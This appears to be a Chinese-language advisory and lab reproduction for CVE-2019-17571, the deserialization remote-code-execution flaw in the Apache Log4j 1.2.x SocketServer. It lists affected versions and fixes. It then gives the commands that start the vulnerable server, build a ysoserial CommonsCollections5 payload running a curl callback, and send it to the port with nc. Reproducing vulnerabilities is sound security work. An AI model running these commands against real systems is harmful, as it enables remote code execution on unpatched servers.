# CVE-2019-17571/Apache Log4j 1.2.X存在反序列化远程代码执行漏洞  

漏洞预警参考链接： https://mp.weixin.qq.com/s/okU2y0izfnKXXtXG3EfLkQ  

### 1. 漏洞描述  

Apache Log4j是美国阿帕奇（Apache）软件基金会的一款基于Java的开源日志记录工具.Apache Log4j 1.2.X系列版本中存在反序列化远程代码执行漏洞.攻击者可利用该漏洞执行任意恶意命令.在Log4j 1.2.X中包含一个SocketServer类,该类很容易对不可信数据进行反序列化,当侦听日志数据的不可信网络流量时,与反序列化小工具结合使用时,可以利用该类远程执行任意代码.影响包含目前最新版本.

### 2. 漏洞危害  
高危  

影响范围
1.2.4 <= Apache Log4j <= 1.2.17(最新版)

修复建议
1.升级到Apache Log4j 2系列最新版

2.禁止将该类所开启的socket端口暴露到互联网

### 3. 漏洞验证  
Apache Log4j 2.8.1时代就存在反序列化远程代码执行漏洞(CVE-2017-5645),当时触发的漏洞类为org.apache.logging.log4j.core.net.server.TcpSocketServer,到了Apache Log4j 1.2.X时代,漏洞类变为org.apache.log4j.net.SocketServer   

#### 1. 启动漏洞环境  

通过晚上查找，发现启动log4j 1.X的socketserver的方式是通过java命令，而非通过java代码开启。（如果有其它开启方式，欢迎告知）   

同样，需要下载受影响的jar包以及可以进行代码执行的jar包，设置到环境变量中(以下为windows环境)，启动服务，传递3个参数，一个是端口、log4j配置文件、lcf目录：  

	java -cp log4j-1.2.17.jar;c3p0-0.9.5.2.jar;mchange-commons-java-0.2.11.jar;commons-collections-3.1.jar org.apache.log4j.net.SocketServer 4560 log4jserver.properties ./    
	
	java -cp log4j-1.2.17.jar:../commons-collections/commons-collections-3.1.jar org.apache.log4j.net.SocketServer 4560 config/log4jserver.properties ./
	

#### 2. 利用log4j2的RCE POC  
	
		java -jar ysoserial-master.jar CommonsCollections5 "curl http://127.0.0.1/ssrf/ssrf.php?rand=log4j" > log4j.curl.bin  
	
#### 3. nc发送恶意socket  

	nc 127.0.0.1 4560 < log4j.curl.bin

相关jar包获取：https://github.com/shadow-horse/Vulenvironment/libs    



